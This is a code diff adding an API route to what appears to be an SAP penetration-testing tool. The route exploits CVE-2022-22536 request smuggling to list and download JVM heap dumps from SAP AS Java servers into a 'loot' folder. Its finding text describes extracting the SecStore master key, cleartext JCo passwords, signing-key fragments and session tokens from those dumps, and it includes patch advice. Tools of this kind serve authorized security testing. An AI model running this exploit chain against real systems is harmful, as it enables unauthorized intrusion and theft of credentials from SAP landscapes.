@@ -4117,6 +4117,128 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:icmad_acl_bypass", "ICMAD ACL Bypass Sweep", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/icmad_heapdump_pull", method="POST")
+    def node_icmad_heapdump_pull(sid):
+        """D.3 — pull an HPROF heap dump via the ICMAD smuggle bypass.
+
+        Two-step UX:
+          1. POST with no ``dump`` field → list available heap dumps
+             on the target.  Returns ``{"dumps": [...]}``.
+          2. POST with ``dump=<filename>`` → download that dump to the
+             loot directory.  Streams; emits ``icmad.heapdump.captured``
+             finding (CRITICAL) on success.
+
+        Enabled only after D.2 confirmed bypass to ``/heapdump/`` (i.e.
+        ``node.cve_2022_22536_acl_bypass['/heapdump/']['via'] ==
+        'smuggle'``).  Per locked decision 2, D.3 ships in v1.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not node.cve_2022_22536_port:
+            return json.dumps({
+                "error": "Run Check CVE-2022-22536 first"
+            })
+        body = request.json or {}
+        dump_name = body.get("dump", "")
+        outer_path = body.get("outer_path", "/sap/admin/public/default.html")
+
+        host = node.ip or node.hostname
+        port = node.cve_2022_22536_port
+        https = node.cve_2022_22536_https
+
+        if not dump_name:
+            # Step 1: list dumps (synchronous, fast)
+            from sap_cve_2022_22536 import list_heap_dumps
+            try:
+                r = list_heap_dumps(host, port, https=https,
+                                      saprouter=node.saprouter or "",
+                                      outer_path=outer_path,
+                                      verbose=True)
+            except Exception as e:
+                return json.dumps({"error": f"list failed: {e}"})
+            return json.dumps({"dumps": r["dumps"],
+                                "reachable": r["reachable"],
+                                "snippet": r["snippet"][:300]})
+
+        # Step 2: download (async, can be slow)
+        def _run():
+            import os, time
+            from sap_cve_2022_22536 import download_heap_dump
+            loot_dir = os.path.join(os.path.expanduser("~"),
+                                      ".sapmap", "loot", sid)
+            try: os.makedirs(loot_dir, exist_ok=True)
+            except OSError: loot_dir = "/tmp"
+            ts = time.strftime("%Y%m%d_%H%M%S")
+            base = os.path.basename(dump_name).replace("/", "_") or "heapdump"
+            save_to = os.path.join(loot_dir,
+                                     f"icmad_{ts}_{base}.hprof")
+
+            def _progress(n):
+                mb = n / (1024 * 1024)
+                if int(mb) % 10 == 0:
+                    print(f"[*] {sid}: heap-dump pull progress {mb:.0f} MB")
+
+            print(f"[*] {sid}: starting ICMAD heap-dump pull of "
+                  f"{dump_name} → {save_to}")
+            r = download_heap_dump(host, port, dump_name, https=https,
+                                     saprouter=node.saprouter or "",
+                                     outer_path=outer_path,
+                                     save_to=save_to,
+                                     progress_cb=_progress)
+            if r["bytes_written"] > 0 and r["complete"]:
+                mb = r["bytes_written"] / (1024 * 1024)
+                print(f"[+] {sid}: ICMAD heap-dump CAPTURED — {mb:.1f} MB "
+                      f"saved to {r['saved_to']}")
+                emit_finding(
+                    "CRITICAL", sid,
+                    f"ICMAD: HPROF heap dump captured "
+                    f"({mb:.0f} MB) via CVE-2022-22536 bypass",
+                    cve="CVE-2022-22536",
+                )
+                node.findings.append(Finding(
+                    name="CVE-2022-22536 — HPROF heap dump captured",
+                    severity=Severity.CRITICAL,
+                    description=(
+                        f"Successfully downloaded a JVM heap dump "
+                        f"({mb:.1f} MB) from the AS Java backend by "
+                        f"smuggling a GET request past the Web "
+                        f"Dispatcher's wdisp/permission_table.  The "
+                        f"HPROF file contains the SecStoreFS keyphrase "
+                        f"bytes, JCo destination passwords in cleartext, "
+                        f"SAPLogonTicket signing key fragments, and "
+                        f"active session tokens for high-value users.  "
+                        f"To recover the SecStore master key offline, "
+                        f"feed the saved HPROF through an HPROF parser "
+                        f"(jhat / IBM HeapAnalyzer / strings -a) and "
+                        f"locate the SecStoreFS._keyBytes 20-byte array. "
+                        f"From there, the same XOR deobfuscation +"
+                        f"PBKDF2 decrypt flow in "
+                        f"modules/data_extraction/sapmap_secstore.py "
+                        f"recovers SAP<SID>DB passwords and JCo "
+                        f"destination secrets."
+                    ),
+                    remediation=(
+                        "Patch CVE-2022-22536 per SAP Note 3123396 to "
+                        "prevent the smuggle from reaching /heapdump/. "
+                        "Additionally: restrict /heapdump/ via the AS "
+                        "Java security role, or unbind the heapdump "
+                        "ICF service entirely if not needed for "
+                        "production debugging."
+                    ),
+                    detail=f"HPROF saved to {r['saved_to']}",
+                ))
+                node.has_critical_finding = True
+                node.pwned = True
+            else:
+                print(f"[-] {sid}: ICMAD heap-dump pull incomplete — "
+                      f"{r['bytes_written']} bytes, "
+                      f"err={r['error'] or 'partial'}")
+
+        _bg(f"{sid}:icmad_heapdump", "ICMAD Heap-Dump Pull", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/check_cve_2020_6287", method="POST")
     def node_check_cve_2020_6287(sid):
         """Probe Java ports for CVE-2020-6287 (RECON)."""
